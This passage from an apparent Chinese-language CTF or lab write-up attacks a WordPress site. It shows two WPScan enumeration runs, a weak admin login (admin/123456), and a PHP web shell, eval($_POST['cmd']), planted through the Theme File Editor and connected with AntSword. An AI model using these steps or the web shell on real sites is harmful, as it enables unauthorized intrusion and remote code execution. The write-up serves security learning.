+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><code class="hljs nix">wpscan <span class="hljs-operator">-</span>-url <span class="hljs-string">&quot;http://39.99.151.78/&quot;</span><br>wpscan <span class="hljs-operator">-</span>-url <span class="hljs-string">&quot;http://39.99.151.78/&quot;</span><br>_______________________________________________________________<br>         __          _______   _____<br>         \ \        <span class="hljs-symbol">/</span> <span class="hljs-symbol">/</span>  __ \ <span class="hljs-symbol">/</span> ____|<br>          \ \  <span class="hljs-operator">/</span>\  <span class="hljs-symbol">/</span> <span class="hljs-operator">/</span>| |__) | (___   ___  __ _ _ __ ®<br>           \ \<span class="hljs-symbol">/</span>  \<span class="hljs-symbol">/</span> <span class="hljs-symbol">/</span> |  ___<span class="hljs-symbol">/</span> \___ \ <span class="hljs-symbol">/</span> __|<span class="hljs-symbol">/</span> _` | &#x27;_ \<br>            \  <span class="hljs-operator">/</span>\  <span class="hljs-symbol">/</span>  | |     ____) | (__| (_| | | | |<br>             \<span class="hljs-symbol">/</span>  \<span class="hljs-symbol">/</span>   |_|    |_____<span class="hljs-symbol">/</span> \___|\__,_|_| |_|<br><br>         WordPress Security Scanner by the WPScan Team<br>                         Version <span class="hljs-number">3.8</span>.<span class="hljs-number">28</span><br>       Sponsored by Automattic <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>automattic.com<span class="hljs-symbol">/</span><br>       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart<br>_______________________________________________________________<br><br>[<span class="hljs-operator">+</span>] <span class="hljs-params">URL:</span> http:<span class="hljs-operator">//</span><span class="hljs-number">39.99</span>.<span class="hljs-number">151.78</span><span class="hljs-symbol">/</span> [<span class="hljs-number">39.99</span>.<span class="hljs-number">151.78</span>]<br>[<span class="hljs-operator">+</span>] <span class="hljs-params">Started:</span> Fri Aug <span class="hljs-number">29</span> <span class="hljs-number">00</span>:<span class="hljs-number">42</span>:<span class="hljs-number">16</span> <span class="hljs-number">2025</span><br><br>Interesting Finding(s):<br><br>[<span class="hljs-operator">+</span>] Headers<br> | Interesting <span class="hljs-params">Entry:</span> <span class="hljs-params">Server:</span> Apache<span class="hljs-symbol">/2.4.41</span> (Ubuntu)<br> | Found <span class="hljs-params">By:</span> Headers (Passive Detection)<br> | <span class="hljs-params">Confidence:</span> <span class="hljs-number">100</span>%<br><br>[<span class="hljs-operator">+</span>] XML-RPC seems to be <span class="hljs-params">enabled:</span> http:<span class="hljs-symbol">//39.99.151.78/xmlrpc.php</span><br> | Found <span class="hljs-params">By:</span> Direct Access (Aggressive Detection)<br> | <span class="hljs-params">Confidence:</span> <span class="hljs-number">100</span>%<br> | <span class="hljs-params">References:</span><br> |  <span class="hljs-operator">-</span> http:<span class="hljs-symbol">//codex.wordpress.org/XML-RPC_Pingback_API</span><br> |  <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>www.rapid7.com<span class="hljs-operator">/</span>db<span class="hljs-operator">/</span>modules<span class="hljs-operator">/</span>auxiliary<span class="hljs-operator">/</span>scanner<span class="hljs-operator">/</span>http<span class="hljs-operator">/</span>wordpress_ghost_scanner<span class="hljs-symbol">/</span><br> |  <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>www.rapid7.com<span class="hljs-operator">/</span>db<span class="hljs-operator">/</span>modules<span class="hljs-operator">/</span>auxiliary<span class="hljs-operator">/</span>dos<span class="hljs-operator">/</span>http<span class="hljs-operator">/</span>wordpress_xmlrpc_dos<span class="hljs-symbol">/</span><br> |  <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>www.rapid7.com<span class="hljs-operator">/</span>db<span class="hljs-operator">/</span>modules<span class="hljs-operator">/</span>auxiliary<span class="hljs-operator">/</span>scanner<span class="hljs-operator">/</span>http<span class="hljs-operator">/</span>wordpress_xmlrpc_login<span class="hljs-symbol">/</span><br> |  <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>www.rapid7.com<span class="hljs-operator">/</span>db<span class="hljs-operator">/</span>modules<span class="hljs-operator">/</span>auxiliary<span class="hljs-operator">/</span>scanner<span class="hljs-operator">/</span>http<span class="hljs-operator">/</span>wordpress_pingback_access<span class="hljs-symbol">/</span><br><br>[<span class="hljs-operator">+</span>] WordPress readme <span class="hljs-params">found:</span> http:<span class="hljs-symbol">//39.99.151.78/readme.html</span><br> | Found <span class="hljs-params">By:</span> Direct Access (Aggressive Detection)<br> | <span class="hljs-params">Confidence:</span> <span class="hljs-number">100</span>%<br><br>[<span class="hljs-operator">+</span>] Upload directory has listing <span class="hljs-params">enabled:</span> http:<span class="hljs-operator">//</span><span class="hljs-number">39.99</span>.<span class="hljs-number">151.78</span><span class="hljs-operator">/</span>wp-content<span class="hljs-operator">/</span>uploads<span class="hljs-symbol">/</span><br> | Found <span class="hljs-params">By:</span> Direct Access (Aggressive Detection)<br> | <span class="hljs-params">Confidence:</span> <span class="hljs-number">100</span>%<br><br>[<span class="hljs-operator">+</span>] The external WP-Cron seems to be <span class="hljs-params">enabled:</span> http:<span class="hljs-symbol">//39.99.151.78/wp-cron.php</span><br> | Found <span class="hljs-params">By:</span> Direct Access (Aggressive Detection)<br> | <span class="hljs-params">Confidence:</span> <span class="hljs-number">60</span>%<br> | <span class="hljs-params">References:</span><br> |  <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//www.iplocation.net/defend-wordpress-from-ddos</span><br> |  <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/wpscanteam/wpscan/issues/1299</span><br><br>[<span class="hljs-operator">+</span>] WordPress version <span class="hljs-number">6.2</span>.<span class="hljs-number">7</span> identified (Outdated, released on <span class="hljs-number">202</span>5-<span class="hljs-number">0</span>8-<span class="hljs-number">05</span>).<br> | Found <span class="hljs-params">By:</span> Rss Generator (Passive Detection)<br> |  <span class="hljs-operator">-</span> http:<span class="hljs-operator">//</span><span class="hljs-number">39.99</span>.<span class="hljs-number">151.78</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>feed<span class="hljs-operator">/</span>, <span class="hljs-symbol">&lt;generator&gt;</span>https:<span class="hljs-operator">//</span>wordpress.org<span class="hljs-operator">/</span><span class="hljs-operator">?</span>v<span class="hljs-operator">=</span><span class="hljs-number">6.2</span>.<span class="hljs-number">7</span><span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>generator<span class="hljs-operator">&gt;</span><br> |  <span class="hljs-operator">-</span> http:<span class="hljs-operator">//</span><span class="hljs-number">39.99</span>.<span class="hljs-number">151.78</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>comments<span class="hljs-operator">/</span>feed<span class="hljs-operator">/</span>, <span class="hljs-symbol">&lt;generator&gt;</span>https:<span class="hljs-operator">//</span>wordpress.org<span class="hljs-operator">/</span><span class="hljs-operator">?</span>v<span class="hljs-operator">=</span><span class="hljs-number">6.2</span>.<span class="hljs-number">7</span><span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>generator<span class="hljs-operator">&gt;</span><br><br>[<span class="hljs-operator">+</span>] WordPress theme <span class="hljs-keyword">in</span> <span class="hljs-params">use:</span> twentytwentyone<br> | <span class="hljs-params">Location:</span> http:<span class="hljs-operator">//</span><span class="hljs-number">39.99</span>.<span class="hljs-number">151.78</span><span class="hljs-operator">/</span>wp-content<span class="hljs-operator">/</span>themes<span class="hljs-operator">/</span>twentytwentyone<span class="hljs-symbol">/</span><br> | Last <span class="hljs-params">Updated:</span> <span class="hljs-number">202</span>5-<span class="hljs-number">0</span>8-<span class="hljs-number">05</span>T00:<span class="hljs-number">00</span>:<span class="hljs-number">00.000</span>Z<br> | <span class="hljs-params">Readme:</span> http:<span class="hljs-symbol">//39.99.151.78/wp-content/themes/twentytwentyone/readme.txt</span><br> | [<span class="hljs-operator">!</span>] The version is out of date, the latest version is <span class="hljs-number">2.6</span><br> | Style <span class="hljs-params">URL:</span> http:<span class="hljs-operator">//</span><span class="hljs-number">39.99</span>.<span class="hljs-number">151.78</span><span class="hljs-operator">/</span>wp-content<span class="hljs-operator">/</span>themes<span class="hljs-operator">/</span>twentytwentyone<span class="hljs-operator">/</span>style.css<span class="hljs-operator">?</span>ver<span class="hljs-operator">=</span><span class="hljs-number">1.8</span><br> | Style <span class="hljs-params">Name:</span> Twenty Twenty-One<br> | Style <span class="hljs-params">URI:</span> https:<span class="hljs-operator">//</span>wordpress.org<span class="hljs-operator">/</span>themes<span class="hljs-operator">/</span>twentytwentyone<span class="hljs-symbol">/</span><br> | <span class="hljs-params">Description:</span> Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...<br> | <span class="hljs-params">Author:</span> the WordPress team<br> | Author <span class="hljs-params">URI:</span> https:<span class="hljs-operator">//</span>wordpress.org<span class="hljs-symbol">/</span><br> |<br> | Found <span class="hljs-params">By:</span> Css Style In Homepage (Passive Detection)<br> |<br> | <span class="hljs-params">Version:</span> <span class="hljs-number">1.8</span> (<span class="hljs-number">80</span>% confidence)<br> | Found <span class="hljs-params">By:</span> Style (Passive Detection)<br> |  <span class="hljs-operator">-</span> http:<span class="hljs-operator">//</span><span class="hljs-number">39.99</span>.<span class="hljs-number">151.78</span><span class="hljs-operator">/</span>wp-content<span class="hljs-operator">/</span>themes<span class="hljs-operator">/</span>twentytwentyone<span class="hljs-operator">/</span>style.css<span class="hljs-operator">?</span>ver<span class="hljs-operator">=</span><span class="hljs-number">1.8</span>, <span class="hljs-params">Match:</span> &#x27;<span class="hljs-params">Version:</span> <span class="hljs-number">1.8</span>&#x27;<br><br>[<span class="hljs-operator">+</span>] Enumerating All Plugins (via Passive Methods)<br><br>[i] No plugins Found.<br><br>[<span class="hljs-operator">+</span>] Enumerating Config Backups (via Passive and Aggressive Methods)<br> Checking Config Backups <span class="hljs-operator">-</span> <span class="hljs-params">Time:</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">01</span> <span class="hljs-operator">&lt;=</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">&gt;</span> (<span class="hljs-number">137</span> <span class="hljs-symbol">/</span> <span class="hljs-number">137</span>) <span class="hljs-number">100.00</span>% <span class="hljs-params">Time:</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">01</span><br><br>[i] No Config Backups Found.<br><br>[<span class="hljs-operator">!</span>] No WPScan API Token given, as a result vulnerability data has not been output.<br>[<span class="hljs-operator">!</span>] You can get a free API token <span class="hljs-keyword">with</span> <span class="hljs-number">25</span> daily requests by registering at https:<span class="hljs-symbol">//wpscan.com/register</span><br><br>[<span class="hljs-operator">+</span>] <span class="hljs-params">Finished:</span> Fri Aug <span class="hljs-number">29</span> <span class="hljs-number">00</span>:<span class="hljs-number">42</span>:<span class="hljs-number">20</span> <span class="hljs-number">2025</span><br>[<span class="hljs-operator">+</span>] Requests <span class="hljs-params">Done:</span> <span class="hljs-number">170</span><br>[<span class="hljs-operator">+</span>] Cached <span class="hljs-params">Requests:</span> <span class="hljs-number">5</span><br>[<span class="hljs-operator">+</span>] Data <span class="hljs-params">Sent:</span> <span class="hljs-number">43.441</span> KB<br>[<span class="hljs-operator">+</span>] Data <span class="hljs-params">Received:</span> <span class="hljs-number">465.457</span> KB<br>[<span class="hljs-operator">+</span>] Memory <span class="hljs-params">used:</span> <span class="hljs-number">256.555</span> MB<br>[<span class="hljs-operator">+</span>] Elapsed <span class="hljs-params">time:</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">04</span><br>                                       <br><br>wpscan <span class="hljs-operator">-</span>-url <span class="hljs-number">39.99</span>.<span class="hljs-number">151.78</span> <span class="hljs-operator">-</span>-api-token 你的api<br>_______________________________________________________________<br>         __          _______   _____<br>         \ \        <span class="hljs-symbol">/</span> <span class="hljs-symbol">/</span>  __ \ <span class="hljs-symbol">/</span> ____|<br>          \ \  <span class="hljs-operator">/</span>\  <span class="hljs-symbol">/</span> <span class="hljs-operator">/</span>| |__) | (___   ___  __ _ _ __ ®<br>           \ \<span class="hljs-symbol">/</span>  \<span class="hljs-symbol">/</span> <span class="hljs-symbol">/</span> |  ___<span class="hljs-symbol">/</span> \___ \ <span class="hljs-symbol">/</span> __|<span class="hljs-symbol">/</span> _` | &#x27;_ \<br>            \  <span class="hljs-operator">/</span>\  <span class="hljs-symbol">/</span>  | |     ____) | (__| (_| | | | |<br>             \<span class="hljs-symbol">/</span>  \<span class="hljs-symbol">/</span>   |_|    |_____<span class="hljs-symbol">/</span> \___|\__,_|_| |_|<br><br>         WordPress Security Scanner by the WPScan Team<br>                         Version <span class="hljs-number">3.8</span>.<span class="hljs-number">28</span><br>       Sponsored by Automattic <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>automattic.com<span class="hljs-symbol">/</span><br>       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart<br>_______________________________________________________________<br><br>[<span class="hljs-operator">+</span>] <span class="hljs-params">URL:</span> http:<span class="hljs-operator">//</span><span class="hljs-number">39.99</span>.<span class="hljs-number">151.78</span><span class="hljs-symbol">/</span> [<span class="hljs-number">39.99</span>.<span class="hljs-number">151.78</span>]<br>[<span class="hljs-operator">+</span>] <span class="hljs-params">Started:</span> Fri Aug <span class="hljs-number">29</span> <span class="hljs-number">00</span>:<span class="hljs-number">42</span>:<span class="hljs-number">01</span> <span class="hljs-number">2025</span><br><br>Interesting Finding(s):<br><br>[<span class="hljs-operator">+</span>] Headers<br> | Interesting <span class="hljs-params">Entry:</span> <span class="hljs-params">Server:</span> Apache<span class="hljs-symbol">/2.4.41</span> (Ubuntu)<br> | Found <span class="hljs-params">By:</span> Headers (Passive Detection)<br> | <span class="hljs-params">Confidence:</span> <span class="hljs-number">100</span>%<br><br>[<span class="hljs-operator">+</span>] XML-RPC seems to be <span class="hljs-params">enabled:</span> http:<span class="hljs-symbol">//39.99.151.78/xmlrpc.php</span><br> | Found <span class="hljs-params">By:</span> Direct Access (Aggressive Detection)<br> | <span class="hljs-params">Confidence:</span> <span class="hljs-number">100</span>%<br> | <span class="hljs-params">References:</span><br> |  <span class="hljs-operator">-</span> http:<span class="hljs-symbol">//codex.wordpress.org/XML-RPC_Pingback_API</span><br> |  <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>www.rapid7.com<span class="hljs-operator">/</span>db<span class="hljs-operator">/</span>modules<span class="hljs-operator">/</span>auxiliary<span class="hljs-operator">/</span>scanner<span class="hljs-operator">/</span>http<span class="hljs-operator">/</span>wordpress_ghost_scanner<span class="hljs-symbol">/</span><br> |  <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>www.rapid7.com<span class="hljs-operator">/</span>db<span class="hljs-operator">/</span>modules<span class="hljs-operator">/</span>auxiliary<span class="hljs-operator">/</span>dos<span class="hljs-operator">/</span>http<span class="hljs-operator">/</span>wordpress_xmlrpc_dos<span class="hljs-symbol">/</span><br> |  <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>www.rapid7.com<span class="hljs-operator">/</span>db<span class="hljs-operator">/</span>modules<span class="hljs-operator">/</span>auxiliary<span class="hljs-operator">/</span>scanner<span class="hljs-operator">/</span>http<span class="hljs-operator">/</span>wordpress_xmlrpc_login<span class="hljs-symbol">/</span><br> |  <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>www.rapid7.com<span class="hljs-operator">/</span>db<span class="hljs-operator">/</span>modules<span class="hljs-operator">/</span>auxiliary<span class="hljs-operator">/</span>scanner<span class="hljs-operator">/</span>http<span class="hljs-operator">/</span>wordpress_pingback_access<span class="hljs-symbol">/</span><br><br>[<span class="hljs-operator">+</span>] WordPress readme <span class="hljs-params">found:</span> http:<span class="hljs-symbol">//39.99.151.78/readme.html</span><br> | Found <span class="hljs-params">By:</span> Direct Access (Aggressive Detection)<br> | <span class="hljs-params">Confidence:</span> <span class="hljs-number">100</span>%<br><br>[<span class="hljs-operator">+</span>] Upload directory has listing <span class="hljs-params">enabled:</span> http:<span class="hljs-operator">//</span><span class="hljs-number">39.99</span>.<span class="hljs-number">151.78</span><span class="hljs-operator">/</span>wp-content<span class="hljs-operator">/</span>uploads<span class="hljs-symbol">/</span><br> | Found <span class="hljs-params">By:</span> Direct Access (Aggressive Detection)<br> | <span class="hljs-params">Confidence:</span> <span class="hljs-number">100</span>%<br><br>[<span class="hljs-operator">+</span>] The external WP-Cron seems to be <span class="hljs-params">enabled:</span> http:<span class="hljs-symbol">//39.99.151.78/wp-cron.php</span><br> | Found <span class="hljs-params">By:</span> Direct Access (Aggressive Detection)<br> | <span class="hljs-params">Confidence:</span> <span class="hljs-number">60</span>%<br> | <span class="hljs-params">References:</span><br> |  <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//www.iplocation.net/defend-wordpress-from-ddos</span><br> |  <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/wpscanteam/wpscan/issues/1299</span><br><br>[<span class="hljs-operator">+</span>] WordPress version <span class="hljs-number">6.2</span>.<span class="hljs-number">7</span> identified (Outdated, released on <span class="hljs-number">202</span>5-<span class="hljs-number">0</span>8-<span class="hljs-number">05</span>).<br> | Found <span class="hljs-params">By:</span> Rss Generator (Passive Detection)<br> |  <span class="hljs-operator">-</span> http:<span class="hljs-operator">//</span><span class="hljs-number">39.99</span>.<span class="hljs-number">151.78</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>feed<span class="hljs-operator">/</span>, <span class="hljs-symbol">&lt;generator&gt;</span>https:<span class="hljs-operator">//</span>wordpress.org<span class="hljs-operator">/</span><span class="hljs-operator">?</span>v<span class="hljs-operator">=</span><span class="hljs-number">6.2</span>.<span class="hljs-number">7</span><span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>generator<span class="hljs-operator">&gt;</span><br> |  <span class="hljs-operator">-</span> http:<span class="hljs-operator">//</span><span class="hljs-number">39.99</span>.<span class="hljs-number">151.78</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>comments<span class="hljs-operator">/</span>feed<span class="hljs-operator">/</span>, <span class="hljs-symbol">&lt;generator&gt;</span>https:<span class="hljs-operator">//</span>wordpress.org<span class="hljs-operator">/</span><span class="hljs-operator">?</span>v<span class="hljs-operator">=</span><span class="hljs-number">6.2</span>.<span class="hljs-number">7</span><span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>generator<span class="hljs-operator">&gt;</span><br><br>[<span class="hljs-operator">+</span>] WordPress theme <span class="hljs-keyword">in</span> <span class="hljs-params">use:</span> twentytwentyone<br> | <span class="hljs-params">Location:</span> http:<span class="hljs-operator">//</span><span class="hljs-number">39.99</span>.<span class="hljs-number">151.78</span><span class="hljs-operator">/</span>wp-content<span class="hljs-operator">/</span>themes<span class="hljs-operator">/</span>twentytwentyone<span class="hljs-symbol">/</span><br> | Last <span class="hljs-params">Updated:</span> <span class="hljs-number">202</span>5-<span class="hljs-number">0</span>8-<span class="hljs-number">05</span>T00:<span class="hljs-number">00</span>:<span class="hljs-number">00.000</span>Z<br> | <span class="hljs-params">Readme:</span> http:<span class="hljs-symbol">//39.99.151.78/wp-content/themes/twentytwentyone/readme.txt</span><br> | [<span class="hljs-operator">!</span>] The version is out of date, the latest version is <span class="hljs-number">2.6</span><br> | Style <span class="hljs-params">URL:</span> http:<span class="hljs-operator">//</span><span class="hljs-number">39.99</span>.<span class="hljs-number">151.78</span><span class="hljs-operator">/</span>wp-content<span class="hljs-operator">/</span>themes<span class="hljs-operator">/</span>twentytwentyone<span class="hljs-operator">/</span>style.css<span class="hljs-operator">?</span>ver<span class="hljs-operator">=</span><span class="hljs-number">1.8</span><br> | Style <span class="hljs-params">Name:</span> Twenty Twenty-One<br> | Style <span class="hljs-params">URI:</span> https:<span class="hljs-operator">//</span>wordpress.org<span class="hljs-operator">/</span>themes<span class="hljs-operator">/</span>twentytwentyone<span class="hljs-symbol">/</span><br> | <span class="hljs-params">Description:</span> Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...<br> | <span class="hljs-params">Author:</span> the WordPress team<br> | Author <span class="hljs-params">URI:</span> https:<span class="hljs-operator">//</span>wordpress.org<span class="hljs-symbol">/</span><br> |<br> | Found <span class="hljs-params">By:</span> Css Style In Homepage (Passive Detection)<br> |<br> | <span class="hljs-params">Version:</span> <span class="hljs-number">1.8</span> (<span class="hljs-number">80</span>% confidence)<br> | Found <span class="hljs-params">By:</span> Style (Passive Detection)<br> |  <span class="hljs-operator">-</span> http:<span class="hljs-operator">//</span><span class="hljs-number">39.99</span>.<span class="hljs-number">151.78</span><span class="hljs-operator">/</span>wp-content<span class="hljs-operator">/</span>themes<span class="hljs-operator">/</span>twentytwentyone<span class="hljs-operator">/</span>style.css<span class="hljs-operator">?</span>ver<span class="hljs-operator">=</span><span class="hljs-number">1.8</span>, <span class="hljs-params">Match:</span> &#x27;<span class="hljs-params">Version:</span> <span class="hljs-number">1.8</span>&#x27;<br><br>[<span class="hljs-operator">+</span>] Enumerating All Plugins (via Passive Methods)<br><br>[i] No plugins Found.<br><br>[<span class="hljs-operator">+</span>] Enumerating Config Backups (via Passive and Aggressive Methods)<br> Checking Config Backups <span class="hljs-operator">-</span> <span class="hljs-params">Time:</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">01</span> <span class="hljs-operator">&lt;=</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">&gt;</span> (<span class="hljs-number">137</span> <span class="hljs-symbol">/</span> <span class="hljs-number">137</span>) <span class="hljs-number">100.00</span>% <span class="hljs-params">Time:</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">01</span><br><br>[i] No Config Backups Found.<br><br>[<span class="hljs-operator">+</span>] WPScan DB API OK<br> | <span class="hljs-params">Plan:</span> free<br> | Requests Done (during the scan): <span class="hljs-number">2</span><br> | Requests <span class="hljs-params">Remaining:</span> <span class="hljs-number">23</span><br><br>[<span class="hljs-operator">+</span>] <span class="hljs-params">Finished:</span> Fri Aug <span class="hljs-number">29</span> <span class="hljs-number">00</span>:<span class="hljs-number">42</span>:<span class="hljs-number">07</span> <span class="hljs-number">2025</span><br>[<span class="hljs-operator">+</span>] Requests <span class="hljs-params">Done:</span> <span class="hljs-number">174</span><br>[<span class="hljs-operator">+</span>] Cached <span class="hljs-params">Requests:</span> <span class="hljs-number">5</span><br>[<span class="hljs-operator">+</span>] Data <span class="hljs-params">Sent:</span> <span class="hljs-number">43.419</span> KB<br>[<span class="hljs-operator">+</span>] Data <span class="hljs-params">Received:</span> <span class="hljs-number">469.606</span> KB<br>[<span class="hljs-operator">+</span>] Memory <span class="hljs-params">used:</span> <span class="hljs-number">245.055</span> MB<br>[<span class="hljs-operator">+</span>] Elapsed <span class="hljs-params">time:</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">06</span><br><br></code></pre></td></tr></table></figure>
+
+<p>可以弱口令登录后台</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">39.99.151.78</span>/wp-admin                            <br><span class="hljs-attribute">admin</span>/<span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure>
+
+<p>非常常见的wordpress漏洞</p>
+<p>修改模板（主题文件）：Appearance—&gt;Theme File Editor—&gt;Theme Footer成功getshell。</p>
+<pre><code class="hljs">eval($_POST[&quot;cmd&quot;]);
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152210806.png" srcset="/img/loading.gif" lazyload alt="5bf3065228daccbe57b301e888f6c87a"></p>
+<p>连接蚁剑</p>
